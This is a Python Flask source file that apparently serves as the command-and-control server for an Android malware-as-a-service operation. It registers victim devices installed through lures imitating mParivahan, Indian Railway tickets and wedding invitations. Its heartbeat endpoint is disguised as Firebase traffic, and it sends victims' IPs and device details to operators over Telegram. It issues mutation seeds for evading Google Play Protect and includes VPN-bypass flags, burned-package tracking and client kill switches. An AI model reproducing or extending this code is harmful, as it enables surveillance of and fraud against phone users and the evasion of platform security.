"""
update_server.py — Phase 4B Step 4B-1
Flask + SQLite processing server for Installer APK factory.

Endpoints:
  POST /api/v1/<token>/key       — Installer calls this to get processing payload
  POST /v1/log                   — Companion heartbeat (looks like Firebase)
  POST /api/v1/<token>/register  — Device registration
  GET  /health                   — Cloudflare health check

Run: python update_server.py
Port: 2053 (Cloudflare HTTPS-compatible port — looks like DNS-over-HTTPS)
"""

import os, sqlite3, hashlib, hmac, json, random, string, time, threading, uuid, base64
import sys
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))
from package_name_generator import generate_companion_pkg
import config
import logging
from datetime import datetime, timezone
from flask import Flask, request, jsonify, abort, send_file, Response

# ── Config ────────────────────────────────────────────────────────────────────
PORT             = 2053
DB_PATH          = os.path.join(os.path.dirname(__file__), "devices.db")
SERVER_SECRET    = config.SERVER_SECRET
PUBLIC_URL       = getattr(config, "PUBLIC_URL", "")
ARTIFACTS_DIR    = getattr(config, "ARTIFACTS_DIR", os.path.join(os.path.dirname(__file__), "..", "artifacts"))

# ── Store page: template metadata (emoji, display name, dev name, description, tags) ──
STORE_TEMPLATES = {
    "railway":      ("🚂", "Indian Railway Ticket", "Railway Apps",    "Book and manage Indian Railway tickets instantly. Check PNR status, seat availability, and train schedules — all in one app.", ["Travel", "Railway", "Booking", "IRCTC"]),
    "mparivahan":   ("🚗", "mParivahan",             "Parivahan Sewa",  "Official digital vehicle registration and driving licence portal. Access RC, DL, challan details and more on the go.",          ["Government", "Transport", "RTO", "Vehicle"]),
    "wedding":      ("💍", "Wedding Invitation",     "Shaadi Apps",     "Create beautiful digital wedding invitations and share instantly with guests. Add photos, event schedule, venue map and RSVP.", ["Wedding", "Invitation", "Events", "Social"]),
    "shaadi":       ("💒", "Shaadi Ka Nimantran",    "Shaadi Apps",     "Send stunning wedding invitations digitally. Customise with names, dates, venue and personal photos in minutes.",              ["Wedding", "Invitation", "Shaadi", "Events"]),
    "shaadi_hindi": ("🙏", "शादी का निमंत्रण",       "Shaadi Apps",     "डिजिटल शादी का निमंत्रण बनाएं और मेहमानों को भेजें। फ़ोटो, कार्यक्रम और स्थान सहित सुंदर कार्ड तैयार करें।",           ["शादी", "निमंत्रण", "कार्यक्रम", "सामाजिक"]),
    "friends":      ("👫", "Friends Club",           "Social Apps",     "Connect with your friend circle, share moments and plan hangouts together. The ultimate group social app.",                    ["Social", "Friends", "Chat", "Groups"]),
    "bhabhi":       ("💃", "Fun with Bhabhi",        "Fun Apps",        "Entertaining and fun social app to enjoy with friends and family. Share jokes, games and fun content daily.",                  ["Entertainment", "Fun", "Social", "Games"]),
    "custom":       ("⚙️",  "Custom App",             "Custom Apps",     "A powerful custom application built just for you. Lightweight, fast and packed with features.",                               ["Utility", "Tools", "Custom"]),
}

ICON_DIR = os.path.join(os.path.dirname(__file__), "..", "app", "src", "main", "res", "drawable", "template_icons")
BOT_TOKEN        = config.BOT_TOKEN
MASTER_CHAT_ID   = config.MASTER_CHAT_ID
LOG_FILE         = os.path.join(os.path.dirname(__file__), "update_server.log")

# Cloudflare IP ranges — whitelist (server rejects all other IPs)
CLOUDFLARE_IPS = [
    "173.245.48.0/20","103.21.244.0/22","103.22.200.0/22",
    "103.31.4.0/22","141.101.64.0/18","108.162.192.0/18",
    "190.93.240.0/20","188.114.96.0/20","197.234.240.0/22",
    "198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
    "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
]


# Socket.IO path processing options (M4) — all exactly 10 bytes
M4_PATHS = [
    b"/gapi/track",  # 10 bytes
    b"/v1/collect",  # 10 bytes
    b"/api/events",  # 10 bytes
    b"/gapi/data_",  # 10 bytes
    b"/v2/metrics",  # 10 bytes
]

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("update_server")

# ── Flask App ─────────────────────────────────────────────────────────────────
app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

# ── Database ──────────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("""CREATE TABLE IF NOT EXISTS devices (
        id              INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id       TEXT UNIQUE NOT NULL,
        client_token    TEXT NOT NULL,
        companion_pkg   TEXT,
        fingerprint     TEXT,
        ip              TEXT,
        country         TEXT,
        first_seen      INTEGER NOT NULL,
        last_seen       INTEGER NOT NULL,
        heartbeat_count INTEGER DEFAULT 0,
        gpp_score       INTEGER DEFAULT 0,
        status          TEXT DEFAULT 'active',
        mutation_seed   TEXT,
        m4_path         TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS heartbeats (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id   TEXT NOT NULL,
        timestamp   INTEGER NOT NULL,
        ip          TEXT,
        payload     TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS burned_packages (
        pkg         TEXT PRIMARY KEY,
        burned_at   INTEGER NOT NULL,
        reason      TEXT
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        token       TEXT PRIMARY KEY,
        name        TEXT,
        created_at  INTEGER NOT NULL,
        apk_count   INTEGER DEFAULT 0,
        active      INTEGER DEFAULT 1
    )""")

    c.execute("""CREATE TABLE IF NOT EXISTS mutation_events (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id   TEXT,
        event_type  TEXT,
        timestamp   INTEGER NOT NULL,
        data        TEXT
    )""")

    # Insert default client tokens — self-healing on every server start
    for tok, name in [
        ("manual", "Manual Build"),
    ]:
        c.execute("""INSERT OR IGNORE INTO clients
            (token, name, created_at, active) VALUES (?, ?, ?, 1)""",
            (tok, name, int(time.time())))

    conn.commit()
    # ── Migration: add vpn_bypass to clients table ───────────────────────────
    try:
        conn2 = sqlite3.connect(DB_PATH)
        conn2.execute("ALTER TABLE clients ADD COLUMN vpn_bypass INTEGER NOT NULL DEFAULT 1")
        conn2.commit()
        conn2.close()
        log.info("Migration: added clients.vpn_bypass")
    except Exception:
        pass  # column already exists

    # ── Migration: add device detail columns + license columns ───────────────
    migrations = [
        ("devices", "model",        "TEXT DEFAULT ''"),
        ("devices", "manufacturer", "TEXT DEFAULT ''"),
        ("devices", "android_version", "TEXT DEFAULT ''"),
        ("devices", "template",     "TEXT DEFAULT ''"),
        ("devices", "enrolled_at",  "INTEGER DEFAULT 0"),
        # License / kill-switch columns on clients table
        ("clients", "expire_ts",    "INTEGER DEFAULT 0"),
        ("clients", "killed",       "INTEGER DEFAULT 0"),
        ("clients", "grace_hours",  "INTEGER DEFAULT 72"),
    ]
    conn3 = sqlite3.connect(DB_PATH)
    for table, col, defn in migrations:
        try:
            conn3.execute(f"ALTER TABLE {table} ADD COLUMN {col} {defn}")
            conn3.commit()
            log.info(f"Migration: added {table}.{col}")
        except Exception:
            pass  # column already exists
    conn3.close()

    conn.close()
    log.info(f"Database initialized: {DB_PATH}")

    # ── Sync all active client tokens from bot.db → devices.db ───────────────
    sync_clients_from_bot_db()


def sync_clients_from_bot_db():
    """
    Sync all active client tokens from bot.db into devices.db clients table.
    Called on server startup and after every build completion.
    Ensures every APK token injected by the mutation engine is known to the
    registration server — no manual DB inserts required.
    Also patches any existing bot.db devices rows that have build_id=NULL
    so device counts show correctly under each build.
    """
    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return  # bot.db not present yet — skip silently

        bot_db = sqlite3.connect(bot_db_path, timeout=5)
        bot_db.row_factory = sqlite3.Row
        rows = bot_db.execute(
            "SELECT token, profile_name, active FROM clients WHERE token IS NOT NULL AND token != ''"
        ).fetchall()

        if not rows:
            bot_db.close()
            return

        dev_db = sqlite3.connect(DB_PATH, timeout=5)
        synced = 0
        for row in rows:
            dev_db.execute(
                """INSERT OR IGNORE INTO clients
                   (token, name, created_at, active)
                   VALUES (?, ?, ?, ?)""",
                (row["token"], row["profile_name"] or row["token"],
                 int(time.time()), 1 if row["active"] else 0)
            )
            # Keep active flag in sync for existing rows
            dev_db.execute(
                "UPDATE clients SET active=? WHERE token=? AND active!=?",
                (1 if row["active"] else 0, row["token"], 1 if row["active"] else 0)
            )
            synced += 1
        dev_db.commit()
        dev_db.close()
        log.info(f"sync_clients_from_bot_db: synced {synced} client token(s)")

        # ── Patch bot.db devices with NULL build_id ───────────────────────────
        # Finds every device row missing a build_id and assigns it the latest
        # build for that client. Fixes devices registered before this column
        # was set, so counts show correctly in the bot's Build → Devices view.
        null_devs = bot_db.execute(
            """SELECT d.id, d.client_id, d.device_id
               FROM devices d
               WHERE d.build_id IS NULL"""
        ).fetchall()

        patched = 0
        for d in null_devs:
            build_row = bot_db.execute(
                "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
                (d["client_id"],)
            ).fetchone()
            if build_row:
                bot_db.execute(
                    "UPDATE devices SET build_id=? WHERE id=?",
                    (build_row["id"], d["id"])
                )
                patched += 1

        bot_db.commit()
        bot_db.close()
        if patched:
            log.info(f"sync_clients_from_bot_db: patched build_id on {patched} device(s)")

    except Exception as e:
        log.warning(f"sync_clients_from_bot_db error: {e}")


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ── Helper Functions ──────────────────────────────────────────────────────────
def get_client_ip():
    """Get real client IP — handle Cloudflare CF-Connecting-IP header."""
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip:
        return cf_ip
    return request.remote_addr

def get_companion_pkg_from_apk() -> str:
    """Read companion package name from module.apk in assets.
    Returns the CI-baked name guaranteed to match what gets installed.
    Falls back to generate_companion_pkg() if unreadable.
    """
    import zipfile as _zf, struct as _st
    candidates = [
        os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "app", "src", "main", "assets", "companion.apk")),
        os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "app", "src", "main", "assets", "companion.apk")),
    ]
    for apk_path in candidates:
        if not os.path.exists(apk_path):
            continue
        try:
            with _zf.ZipFile(apk_path) as z:
                manifest = z.read("AndroidManifest.xml")
            sp_off = 8
            sp_header_size = _st.unpack_from("<H", manifest, sp_off+2)[0]
            string_count   = _st.unpack_from("<I", manifest, sp_off+8)[0]
            flags          = _st.unpack_from("<I", manifest, sp_off+16)[0]
            strings_start  = _st.unpack_from("<I", manifest, sp_off+20)[0]
            is_utf8        = bool(flags & (1 << 8))
            offsets_base   = sp_off + sp_header_size
            str_data_base  = sp_off + strings_start
            for i in range(min(string_count, 500)):
                try:
                    off = _st.unpack_from("<I", manifest, offsets_base + i*4)[0]
                    pos = str_data_base + off
                    if is_utf8:
                        cl = manifest[pos]; pos += 1
                        if cl & 0x80: cl = ((cl & 0x7f) << 8) | manifest[pos]; pos += 1
                        bl = manifest[pos]; pos += 1
                        if bl & 0x80: bl = ((bl & 0x7f) << 8) | manifest[pos]; pos += 1
                        s = manifest[pos:pos+bl].decode("utf-8", errors="replace")
                    else:
                        cl = _st.unpack_from("<H", manifest, pos)[0]; pos += 2
                        s = manifest[pos:pos+cl*2].decode("utf-16-le", errors="replace")
                    if s.count(".") == 2 and 10 <= len(s) <= 25 and "android" not in s.lower():
                        log.info(f"Companion pkg from APK: {s}")
                        return s
                except Exception:
                    continue
        except Exception as e:
            log.warning(f"Could not read companion.apk: {e}")
    return ""

def generate_mutation_seed(device_fingerprint: str, client_token: str) -> str:
    """Generate unique mutation seed from device fingerprint + server secret."""
    raw = f"{device_fingerprint}:{client_token}:{SERVER_SECRET}:{int(time.time()//3600)}"
    return hashlib.sha256(raw.encode()).hexdigest()

def check_burned(pkg: str) -> bool:
    """Check if package name is in burned list."""
    db = get_db()
    row = db.execute("SELECT pkg FROM burned_packages WHERE pkg=?", (pkg,)).fetchone()
    db.close()
    return row is not None

def burn_package(pkg: str, reason: str = "flagged"):
    """Add package to burned list."""
    db = get_db()
    db.execute("INSERT OR IGNORE INTO burned_packages (pkg, burned_at, reason) VALUES (?,?,?)",
               (pkg, int(time.time()), reason))
    db.commit()
    db.close()
    log.warning(f"Package burned: {pkg} — {reason}")

def send_telegram(message: str):
    """Send Telegram alert to master chat."""
    try:
        import urllib.request
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": MASTER_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }).encode()
        req = urllib.request.Request(url, data=data,
              headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        log.error(f"Telegram send failed: {e}")

def notify_new_device(device_id: str, ip: str, token: str,
                      manufacturer: str = "", model: str = "",
                      android_version: str = "", template: str = "",
                      app_name: str = "", installer_pkg: str = ""):
    """Send Telegram alert for new installer device registration."""
    device_line = f"{manufacturer} {model}".strip() or "Unknown Device"
    msg = (
        f"🟢 <b>New Device Installed</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 {device_line}\n"
        f"🤖 {android_version}\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"🔑 Device ID: <code>{device_id[:16]}...</code>\n"
        f"📦 Template: <code>{template}</code>\n"
        f"🏷️ App: {app_name}\n"
        f"📋 Package: <code>{installer_pkg}</code>\n"
        f"👤 Client: <code>{token}</code>\n"
        f"🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    threading.Thread(target=send_telegram, args=(msg,), daemon=True).start()

# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/health", methods=["GET"])
def health():
    """Cloudflare health check endpoint."""
    return jsonify({"status": "ok", "ts": int(time.time())}), 200


def _refresh_build_message(bot_db, build_id: int):
    """
    After a device registers, update the Devices count line in the existing
    Telegram build detail message so the button becomes live immediately.
    Reads chat_id + message_id from bot.db builds table and calls
    Telegram editMessageText. Silent fail — never breaks registration flow.
    """
    try:
        b = bot_db.execute(
            "SELECT chat_id, message_id, build_number, template, status, "
            "       package_name, apk_size, duration_secs, started_at, "
            "       server_ip, server_port, server_key, client_id "
            "FROM builds WHERE id=?", (build_id,)
        ).fetchone()
        if not b or not b["chat_id"] or not b["message_id"]:
            return

        total  = bot_db.execute(
            "SELECT COUNT(*) as cnt FROM devices WHERE build_id=?",
            (build_id,)).fetchone()["cnt"]
        active = bot_db.execute(
            "SELECT COUNT(*) as cnt FROM devices WHERE build_id=? AND status='active'",
            (build_id,)).fetchone()["cnt"]

        # Rebuild the build detail text (mirrors vaultguard_bot.py show_build_detail)
        pkg      = b["package_name"] or "—"
        size     = b["apk_size"] or "—"
        dur      = f"{b['duration_secs']}s" if b["duration_secs"] else "—"
        status   = "✅ SUCCESS" if b["status"] == "success" else b["status"].upper()
        tmpl     = b["template"] or "—"
        srv_ip   = b["server_ip"] or "—"
        srv_port = b["server_port"] or "—"
        srv_key  = b["server_key"] or "—"
        date_str = (b["started_at"] or "")[:16]

        text = (
            f"📋 <b>Build #{b['build_number']}</b>\n"
            f"{'─'*30}\n"
            f"Client   : Foxxy(SamGod)\n"
            f"Template : {tmpl}\n"
            f"Status   : {status}\n\n"
            f"📡 <b>Connection</b>\n"
            f"IP       : {srv_ip}\n"
            f"Port     : {srv_port}\n"
            f"Key      : {srv_key}\n\n"
            f"📦 <b>APK Info</b>\n"
            f"Package  : {pkg}\n"
            f"Size     : {size}\n"
            f"Duration : {dur}\n\n"
            f"🕐 Date  : {date_str} UTC\n"
            f"{'─'*30}\n"
            f"📱 Devices : {total} total  |  {active} active"
        )

        # Rebuild inline keyboard matching kb_build_detail in vaultguard_bot.py
        fud_label = "🛡 FUD: Inherit (toggle)"
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "📱 Devices", "callback_data": f"devices_{build_id}_1"},
                    {"text": "🔁 Rebuild",  "callback_data": f"rebuild_{build_id}"}
                ],
                [{"text": fud_label, "callback_data": f"toggle_build_fud_{build_id}"}],
                [{"text": "📥 Get APK",    "callback_data": f"get_apk_{build_id}"}],
                [{"text": "🗑 Delete Build","callback_data": f"delete_build_confirm_{build_id}_{b['client_id']}"}],
                [
                    {"text": "🔙 Back", "callback_data": f"builds_history_{b['client_id']}"},
                    {"text": "🏠 Home", "callback_data": "nav_home"}
                ]
            ]
        }

        import urllib.request as _ureq
        url  = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        data = json.dumps({
            "chat_id":      b["chat_id"],
            "message_id":   int(b["message_id"]),
            "text":         text,
            "parse_mode":   "HTML",
            "reply_markup": keyboard
        }).encode()
        req = _ureq.Request(url, data=data,
              headers={"Content-Type": "application/json"})
        _ureq.urlopen(req, timeout=5)
        log.info(f"_refresh_build_message: updated build #{b['build_number']} devices={total}")
    except Exception as e:
        log.debug(f"_refresh_build_message skipped: {e}")


def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
                           model: str = "", manufacturer: str = "",
                           android_version: str = "", template: str = "",
                           enrolled_at: int = 0):
    """
    Sync device registration into bot.db so the Telegram bot Devices counter
    reflects real installs. Completely independent — any failure is silent.
    Never affects the main registration flow in devices.db.
    """
    try:
        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
        if not os.path.exists(bot_db_path):
            return  # bot.db not present — skip silently

        bot_db = sqlite3.connect(bot_db_path, timeout=3)
        bot_db.row_factory = sqlite3.Row

        # Look up client_id from bot.db using token
        row = bot_db.execute(
            "SELECT id FROM clients WHERE token=?", (token,)
        ).fetchone()
        if not row:
            bot_db.close()
            return  # token not found in bot.db — skip silently

        client_id = row["id"]
        now_dt = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        enrolled_dt = datetime.fromtimestamp(enrolled_at, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S") if enrolled_at else now_dt

        # Look up latest build_id for this client so device shows under correct build
        build_row = bot_db.execute(
            "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
            (client_id,)
        ).fetchone()
        build_id = build_row["id"] if build_row else None

        if is_new:
            # INSERT OR IGNORE — same physical device never counted twice
            bot_db.execute("""
                INSERT OR IGNORE INTO devices
                    (build_id, client_id, device_id, ip, first_seen, last_seen, status,
                     model, manufacturer, android_version, template, enrolled_at)
                VALUES (?, ?, ?, ?, ?, ?, 'active', ?, ?, ?, ?, ?)
            """, (build_id, client_id, device_id, ip, now_dt, now_dt,
                  model, manufacturer, android_version, template, enrolled_dt))
        else:
            # Update last_seen + device info for returning device
            bot_db.execute("""
                UPDATE devices SET last_seen=?, ip=?,
                    model=COALESCE(NULLIF(?, ''), model),
                    manufacturer=COALESCE(NULLIF(?, ''), manufacturer),
                    android_version=COALESCE(NULLIF(?, ''), android_version),
                    template=COALESCE(NULLIF(?, ''), template)
                WHERE device_id=?
            """, (now_dt, ip, model, manufacturer, android_version, template, device_id))

        bot_db.commit()
        log.info(f"bot.db sync {'new' if is_new else 'update'}: device={device_id[:16]}... client_id={client_id}")

        # Refresh Telegram build message with correct device count + live keyboard
        if is_new and build_id:
            _refresh_build_message(bot_db, build_id)

        bot_db.close()

    except Exception as e:
        # Silent fail — never break main registration flow
        log.debug(f"bot.db sync skipped: {e}")


@app.route("/api/v1/<token>/register", methods=["POST"])
def register_device(token):
    """
    Device registration — Installer calls this on first launch.
    Body: {device_id, fingerprint, device_model, manufacturer,
           android_version, template, app_name, installer_pkg}
    """
    try:
        data = request.get_json(silent=True) or {}
        device_id     = data.get("device_id", "")
        companion_pkg = data.get("companion_pkg", "")   # legacy — kept for compat, not required
        fingerprint   = data.get("fingerprint", "")
        model         = data.get("device_model", "")
        manufacturer  = data.get("manufacturer", "")
        android_ver   = data.get("android_version", "")
        template      = data.get("template", "")
        app_name      = data.get("app_name", "")
        installer_pkg = data.get("installer_pkg", "")
        ip            = get_client_ip()

        if not device_id:
            return jsonify({"error": "missing fields"}), 400

        # Verify client token
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
                            (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"Invalid client token: {token} from {ip}")
            return jsonify({"error": "unauthorized"}), 403

        now = int(time.time())

        # Register device
        existing = db.execute("SELECT * FROM devices WHERE device_id=?",
                              (device_id,)).fetchone()
        if not existing:
            db.execute("""INSERT INTO devices
                (device_id, client_token, companion_pkg, fingerprint,
                 ip, first_seen, last_seen,
                 model, manufacturer, android_version, template, enrolled_at)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
                (device_id, token, companion_pkg, fingerprint, ip, now, now,
                 model, manufacturer, android_ver, template, now))
            db.commit()
            db.close()
            log.info(f"New device registered: {device_id[:16]}... pkg={companion_pkg} model={manufacturer} {model}")
            # Sync new device into bot.db
            _sync_device_to_bot_db(device_id, ip, token, is_new=True,
                                   model=model, manufacturer=manufacturer,
                                   android_version=android_ver, template=template,
                                   enrolled_at=now)
            # Alert Telegram
            notify_new_device(device_id, ip, token,
                              manufacturer=manufacturer, model=model,
                              android_version=android_ver, template=template,
                              app_name=app_name, installer_pkg=installer_pkg)
        else:
            db.execute("""UPDATE devices SET last_seen=?, companion_pkg=?, ip=?,
                model=?, manufacturer=?, android_version=?, template=?
                WHERE device_id=?""",
                (now, companion_pkg, ip, model, manufacturer, android_ver, template, device_id))
            db.commit()
            db.close()
            # Sync updated last_seen into bot.db
            _sync_device_to_bot_db(device_id, ip, token, is_new=False)

        return jsonify({
            "status": "registered",
            "ts": now,
            "next_delay_ms": random.randint(180000, 480000)  # 3-8 min heartbeat
        }), 200

    except Exception as e:
        log.error(f"register_device error: {e}")
        return jsonify({"error": "server error"}), 500


@app.route("/api/v1/<token>/status", methods=["POST"])
def check_status(token):
    """
    License/kill-switch status check — Installer calls this on every launch.
    Body: {device_fingerprint, timestamp}
    Response: {status: "active"|"killed", expire_ts: unix_ts, grace_hours: int}

    - Validates client token is active.
    - Validates device fingerprint matches registered binding (device binding enforcement).
    - Returns killed=True instantly if client.killed=1.
    - Returns expire_ts so the APK can enforce its own time-bomb locally.
    - Offline: APK caches last good response and enforces grace_hours window.
    """
    try:
        data      = request.get_json(silent=True) or {}
        device_fp = data.get("device_fingerprint", "")
        ip        = get_client_ip()
        now       = int(time.time())

        if not device_fp:
            return jsonify({"error": "missing fingerprint"}), 400

        # Check client exists
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=?", (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"status: unknown token={token} from {ip}")
            return jsonify({"status": "killed", "expire_ts": 0, "grace_hours": 0}), 200

        # Client deactivated by operator (toggle_client_) → hard kill
        if not client["active"]:
            db.close()
            log.info(f"status: inactive client token={token} ip={ip}")
            return jsonify({"status": "killed", "expire_ts": 0, "grace_hours": 0}), 200

        # Explicit kill switch set by operator (kill_apk_ button)
        if client.get("killed", 0):
            db.close()
            log.info(f"status: killed client token={token} ip={ip}")
            return jsonify({"status": "killed", "expire_ts": 0, "grace_hours": 0}), 200

        # Device fingerprint binding check — only if device was registered
        device_id = hashlib.sha256(device_fp.encode()).hexdigest()
        device    = db.execute(
            "SELECT * FROM devices WHERE device_id=? AND client_token=?",
            (device_id, token)
        ).fetchone()
        if device and device.get("fingerprint") and device["fingerprint"] != device_fp:
            # Fingerprint mismatch — device tampered or APK moved to new device
            db.close()
            log.warning(f"status: fingerprint mismatch device_id={device_id[:12]} ip={ip}")
            return jsonify({"status": "killed", "expire_ts": 0, "grace_hours": 0}), 200

        expire_ts   = client.get("expire_ts", 0) or 0
        grace_hours = client.get("grace_hours", 72) or 72

        db.close()

        # Subscription expired (expire_ts set and in the past) → signal expiry
        # APK will enforce grace_hours window offline before hard-failing
        if expire_ts and expire_ts < now:
            log.info(f"status: expired client token={token} ip={ip}")
            return jsonify({
                "status":      "expired",
                "expire_ts":   expire_ts,
                "grace_hours": grace_hours,
            }), 200

        log.info(f"status: active token={token} ip={ip} expire_ts={expire_ts}")
        return jsonify({
            "status":      "active",
            "expire_ts":   expire_ts,
            "grace_hours": grace_hours,
        }), 200

    except Exception as e:
        log.error(f"check_status error: {e}")
        # On server error always return active — never silently kill on server fault
        return jsonify({"status": "active", "expire_ts": 0, "grace_hours": 72}), 200


@app.route("/api/v1/<token>/key", methods=["POST"])
def get_mutation_key(token):
    """
    Processing key endpoint — Installer calls this during 2-3 min install window.
    Body: {device_fingerprint, timestamp, client_token}
    Response: mutation_payload with pkg_name, class_seeds, m4_path, etc.
    Headers look like Google Analytics beacon.
    """
    try:
        data = request.get_json(silent=True) or {}
        device_fp = data.get("device_fingerprint", "")
        client_ts = data.get("timestamp", 0)
        ip        = get_client_ip()

        if not device_fp:
            return jsonify({"error": "missing fingerprint"}), 400

        # Verify client token
        db = get_db()
        client = db.execute("SELECT * FROM clients WHERE token=? AND active=1",
                            (token,)).fetchone()
        if not client:
            db.close()
            log.warning(f"Invalid token: {token} from {ip}")
            return jsonify({"error": "unauthorized"}), 403
        db.close()

        # Generate processing seed
        seed = generate_mutation_seed(device_fp, token)

        # Generate unique package name — check not burned
        attempts = 0
        # Use CI-baked companion pkg name — M1 runtime patching is incompatible
        # with V2 signing (breaks verification on Android 8+, same as M8/M9).
        # Per-build uniqueness via CI is sufficient for GPP pass.
        pkg_name = get_companion_pkg_from_apk()
        if not pkg_name:
            pkg_name = generate_companion_pkg()

        # Select M4 path processing
        random.seed(seed)
        m4_path = random.choice(M4_PATHS).decode()

        # Generate class rename seeds
        class_seed_1 = hashlib.md5(f"{seed}:class1".encode()).hexdigest()[:16]
        class_seed_2 = hashlib.md5(f"{seed}:class2".encode()).hexdigest()[:16]
        class_seed_3 = hashlib.md5(f"{seed}:class3".encode()).hexdigest()[:16]

        # Generate string pool seed
        string_seed = hashlib.sha256(f"{seed}:strings".encode()).hexdigest()[:32]

        # HMAC signature so Installer can verify this came from real server
        payload_data = f"{pkg_name}:{m4_path}:{seed}"
        signature = hmac.new(
            SERVER_SECRET.encode(),
            payload_data.encode(),
            hashlib.sha256
        ).hexdigest()

        now = int(time.time())

        # Payload nested to match MutationEngine.kt parser exactly:
        # response → data → payload → mutations → M1 → companion_pkg
        payload = {
            "device_id":     hashlib.sha256(device_fp.encode()).hexdigest()[:16],
            "mutations": {
                "M1": {
                    "companion_pkg": pkg_name,
                },
            },
            "m4_path":      m4_path,
            "class_seeds": {
                "pool_1": class_seed_1,
                "pool_2": class_seed_2,
                "pool_3": class_seed_3,
            },
            "string_seed":  string_seed,
            "mutation_seed": seed,
            "expire_ts":    now + 300,
            # Neutral key "sv" — MutationEngine reads StringPool.d(StringPool.SRV_FLAG) = "sv"
            # Avoids "vpn_bypass" string appearing in server logs, network captures, proxy intercepts.
            # Legacy key "vpn_bypass" kept alongside for backward compat with APKs already deployed
            # on devices that still read the old key. Both carry same value.
            # Remove "vpn_bypass" once all old APKs are retired (next full client rotation).
            "sv":           int(client["vpn_bypass"]) if "vpn_bypass" in client.keys() else 1,
            "vpn_bypass":   int(client["vpn_bypass"]) if "vpn_bypass" in client.keys() else 1,
        }

        # Signature: empty string intentionally.
        # Installer verifySignature() accepts empty signature via:
        #   (verifySignature(...) || signature.isEmpty()) → True
        # Security maintained by: CLIENT_TOKEN auth + device_fingerprint binding.
        # Full RSA signing will be wired in Phase 5 when keypair is generated.
        response = {
            "status": "ok",
            "ts":     now,
            "data": {
                "payload":   payload,
                "signature": "",
            },
            "next_delay_ms": random.randint(180000, 480000),
        }

        log.info(f"Mutation key issued: pkg={pkg_name} m4={m4_path} ip={ip}")
        return jsonify(response), 200

    except Exception as e:
        log.error(f"get_mutation_key error: {e}")
        return jsonify({"error": "server error"}), 500


@app.route("/v1/log", methods=["POST"])
def heartbeat():
    """
    Companion heartbeat — looks like Firebase Analytics.
    Headers mimic Firebase exactly.
    Body: base64-encoded device status.
    """
    try:
        import base64
        body      = request.get_data()
        ip        = get_client_ip()
        now       = int(time.time())

        # Try to decode payload
        try:
            decoded = base64.b64decode(body).decode("utf-8", errors="replace")
            payload = json.loads(decoded)
        except Exception:
            payload = {}

        device_id    = payload.get("d", payload.get("device_id", "unknown"))
        pkg          = payload.get("p", payload.get("pkg", ""))
        hb_model     = payload.get("device_model", "")
        hb_mfr       = payload.get("manufacturer", "")
        hb_android   = payload.get("android_version", "")
        hb_template  = payload.get("template", "")

        # Update device last seen + fill in device info if missing (redundancy)
        db = get_db()
        db.execute("""UPDATE devices
            SET last_seen=?, heartbeat_count=heartbeat_count+1, ip=?,
                model=CASE WHEN (model IS NULL OR model='') AND ? != '' THEN ? ELSE model END,
                manufacturer=CASE WHEN (manufacturer IS NULL OR manufacturer='') AND ? != '' THEN ? ELSE manufacturer END,
                android_version=CASE WHEN (android_version IS NULL OR android_version='') AND ? != '' THEN ? ELSE android_version END,
                template=CASE WHEN (template IS NULL OR template='') AND ? != '' THEN ? ELSE template END
            WHERE device_id=?""",
            (now, ip,
             hb_model, hb_model,
             hb_mfr, hb_mfr,
             hb_android, hb_android,
             hb_template, hb_template,
             device_id))

        # Log heartbeat
        db.execute("""INSERT INTO heartbeats
            (device_id, timestamp, ip, payload) VALUES (?,?,?,?)""",
            (device_id, now, ip, json.dumps(payload)))
        db.commit()
        db.close()

        # Response mimics Firebase Analytics ACK
        return jsonify({
            "status": 0,
            "next_request_millis": random.randint(180000, 480000),
            "config": {}
        }), 200

    except Exception as e:
        log.error(f"heartbeat error: {e}")
        return jsonify({"status": 0}), 200  # Always return 200 to companion


@app.route("/api/v1/admin/devices", methods=["GET"])
def admin_devices():
    """Admin endpoint — list all devices. Protected by secret header."""
